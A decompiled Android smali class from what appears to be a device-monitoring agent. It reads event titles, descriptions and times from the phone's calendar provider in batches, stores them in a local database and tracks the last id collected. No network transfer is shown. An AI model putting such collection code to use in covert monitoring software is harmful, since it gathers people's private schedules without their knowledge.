.class public Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;
.super Ljava/lang/Object;
.source "EventCalendarCallable.java"

# interfaces
.implements Ljava/util/concurrent/Callable;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Ljava/util/concurrent/Callable<",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# static fields
.field protected static final TAG:Ljava/lang/String; = "EventCalendarCallable"


# instance fields
.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EventCalendarData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ContentResolver;",
            "Landroid/net/Uri;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EventCalendarData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 39
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->contentResolver:Landroid/content/ContentResolver;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->contentUri:Landroid/net/Uri;

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 26
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 27
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    .line 28
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 40
    iput-object p1, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->contentResolver:Landroid/content/ContentResolver;

    .line 41
    iput-object p2, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->contentUri:Landroid/net/Uri;

    .line 42
    iput-object p3, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 43
    iput-object p4, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 44
    iput-object p5, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    .line 45
    iput-object p6, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 46
    iput-object p7, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public bridge synthetic call()Ljava/lang/Object;
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 19
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->call()Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method public call()Ljava/lang/Void;
    .locals 9
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 56
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->contentResolver:Landroid/content/ContentResolver;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->contentUri:Landroid/net/Uri;

    const/4 v2, 0x5

    new-array v2, v2, [Ljava/lang/String;

    const-string v3, "_id"

    const/4 v6, 0x0

    aput-object v3, v2, v6

    const-string v3, "title"

    const/4 v4, 0x1

    aput-object v3, v2, v4

    const-string v3, "description"

    const/4 v4, 0x2

    aput-object v3, v2, v4

    const-string v3, "dtstart"

    const/4 v7, 0x3

    aput-object v3, v2, v7

    const-string v3, "dtend"

    const/4 v4, 0x4

    aput-object v3, v2, v4

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "_id > "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "max_internal_id"

    .line 59
    invoke-virtual {v4, v5}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v5, "_id ASC"

    const/4 v4, 0x0

    .line 56
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    .line 65
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EventCalendarCallable"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Could not open a cursor for: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->contentUri:Landroid/net/Uri;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v2, v3, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v1

    .line 74
    :cond_0
    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v2

    .line 76
    iget-object v3, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "EventCalendarCallable"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "call(): total entries: "

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v7, " with _id > "

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v8, "max_internal_id"

    .line 78
    invoke-virtual {v7, v8}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 76
    invoke-interface {v3, v4, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    if-nez v2, :cond_1

    .line 82
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EventCalendarCallable"

    const-string v3, "No entries. Exiting..."

    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-object v1

    :cond_1
    const/4 v2, -0x1

    move v3, v2

    .line 90
    :goto_0
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_2

    add-int/lit8 v6, v6, 0x1

    .line 97
    new-instance v4, Lcom/hp/vd/data/EventCalendarData;

    invoke-direct {v4}, Lcom/hp/vd/data/EventCalendarData;-><init>()V

    :try_start_0
    const-string v5, "_id"

    .line 100
    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/EventCalendarData;->internalId:Ljava/lang/Integer;

    const-string v5, "title"

    .line 101
    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/EventCalendarData;->title:Ljava/lang/String;

    const-string v5, "description"

    .line 102
    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/EventCalendarData;->description:Ljava/lang/String;

    .line 103
    new-instance v5, Ljava/util/Date;

    const-string v7, "dtstart"

    invoke-interface {v0, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v0, v7}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    invoke-direct {v5, v7, v8}, Ljava/util/Date;-><init>(J)V

    iput-object v5, v4, Lcom/hp/vd/data/EventCalendarData;->dateStart:Ljava/util/Date;

    .line 104
    new-instance v5, Ljava/util/Date;

    const-string v7, "dtend"

    invoke-interface {v0, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v0, v7}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    invoke-direct {v5, v7, v8}, Ljava/util/Date;-><init>(J)V

    iput-object v5, v4, Lcom/hp/vd/data/EventCalendarData;->dateEnd:Ljava/util/Date;
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    .line 122
    iget-object v3, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v3, v4}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 124
    iget-object v3, v4, Lcom/hp/vd/data/EventCalendarData;->internalId:Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    goto :goto_0

    :catch_0
    move-exception v4

    .line 109
    iget-object v5, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v7, "EventCalendarCallable"

    const-string v8, "call(): some of the fields cannot be read."

    invoke-interface {v5, v7, v8, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_0

    .line 127
    :cond_2
    iget-object v4, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v5, "EventCalendarCallable"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "run(): events listed = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v4, v5, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 129
    invoke-interface {v0}, Landroid/database/Cursor;->isClosed()Z

    move-result v4

    if-nez v4, :cond_3

    .line 130
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_3
    if-eq v3, v2, :cond_4

    .line 134
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_internal_id"

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 135
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    :cond_4
    return-object v1
.end method
